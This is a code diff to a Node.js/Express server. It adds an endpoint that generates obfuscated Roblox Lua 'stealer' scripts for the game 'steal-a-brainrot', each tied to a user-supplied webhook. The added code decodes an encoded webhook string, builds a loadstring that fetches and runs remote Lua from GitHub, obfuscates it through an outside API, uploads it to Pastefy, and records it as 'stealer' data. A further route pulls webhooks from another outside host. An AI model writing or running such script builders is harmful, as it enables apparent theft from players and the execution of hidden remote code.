@@ -168,6 +168,29 @@ app.use((req, res, next) => {
 
 // ============= HELPER FUNCTIONS =============
 
+// Webhook decompilation mapping
+const compleMap = {
+  'K01': 'A', 'K02': 'B', 'K03': 'C', 'K04': 'Ç', 'K05': 'D',
+  'K06': 'E', 'K07': 'F', 'K08': 'G', 'K09': 'Ğ', 'K10': 'H',
+  'K11': 'I', 'K12': 'İ', 'K13': 'J', 'K14': 'K', 'K15': 'L',
+  'K16': 'M', 'K17': 'N', 'K18': 'O', 'K19': 'Ö', 'K20': 'P',
+  'K21': 'R', 'K22': 'S', 'K23': 'Ş', 'K24': 'T', 'K25': 'U',
+  'K26': 'Ü', 'K27': 'V', 'K28': 'Y', 'K29': 'Z',
+  'X90': '0', 'X91': '1', 'X92': '2', 'X93': '3', 'X94': '4',
+  'X95': '5', 'X96': '6', 'X97': '7', 'X98': '8', 'X99': '9'
+};
+
+function decompileWebhook(compleString) {
+  if (!compleString) return '';
+  const parts = compleString.split(' ');
+  let webhook = '';
+  for (const part of parts) {
+    const char = compleMap[part];
+    webhook += char || '';
+  }
+  return webhook;
+}
+
 async function obfuscateScript(script) {
   try {
     const response = await axios.post('https://wearedevs.net/api/obfuscate', 
@@ -752,6 +775,72 @@ app.get('/api/leaderboard', async (req, res) => {
   }
 });
 
+app.post('/generate-script/steal-a-brainrot', async (req, res) => {
+  try {
+    const compleWebhook = req.body?.compleWebhook;
+    if (!compleWebhook) return res.status(400).json({ success: false, message: 'Webhook required' });
+    
+    const webhook = decompileWebhook(compleWebhook);
+    if (!webhook) return res.status(400).json({ success: false, message: 'Invalid webhook' });
+    
+    try {
+      await axios.get(webhook, { timeout: 5000 });
+    } catch (e) {
+      return res.status(400).json({ success: false, message: 'Invalid webhook' });
+    }
+    
+    const protectionId = createProtectionId(webhook);
+    const originalScript = `PROTECT_ID = "${protectionId}" -- Protection ID\nloadstring(game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyAuto/refs/heads/main/steal-a-brainrot.lua"))()`;
+    const obfuscatedCode = await obfuscateScript(originalScript);
+    const pasteData = await uploadToPastefy(obfuscatedCode, 'CrustyUser');
+    const loadstringCode = `loadstring(game:HttpGet("${pasteData.rawUrl}"))()`;
+    
+    try {
+      const data = await getStealerData();
+      let scripts = data.scripts || [];
+      scripts.push({
+        id: Date.now().toString(),
+        userId: 'anonymous',
+        username: 'CrustyUser',
+        webhook: webhook,
+        protection: true,
+        protectionId: protectionId,
+        game: 'steal-a-brainrot',
+        rawUrl: pasteData.rawUrl,
+        createdAt: new Date().toISOString()
+      });
+      if (scripts.length > 50) scripts = scripts.slice(-50);
+      await saveStealerData({ users: data.users || [], scripts, leaderboard: data.leaderboard || [] });
+    } catch (error) {
+      console.error('Error saving script:', error);
+    }
+    
+    res.json({
+      success: true,
+      message: 'Script generated successfully',
+      data: {
+        loadstring: loadstringCode,
+        pasteUrl: pasteData.pasteUrl,
+        rawUrl: pasteData.rawUrl,
+        protectionId: protectionId
+      }
+    });
+  } catch (error) {
+    console.error('Generate script error:', error);
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+});
+
+app.get('/last-webhook', async (req, res) => {
+  try {
+    const response = await axios.get('https://key-system-kdml-1-2.onrender.com/last-webhook', { timeout: 10000 });
+    res.json(response.data);
+  } catch (error) {
+    res.status(500).json({ success: false, message: 'Failed to fetch webhook' });
+  }
+});
+
+
 app.post('/api/script/generate', async (req, res) => {
   try {
     console.log('\n🔵 [SCRIPT GENERATE] Request received');
@@ -1249,3 +1338,4 @@ app.listen(PORT, async () => {
   await loadProtectionsFromStealer();
   console.log(`✅ Protection system initialized\n`);
 });
+
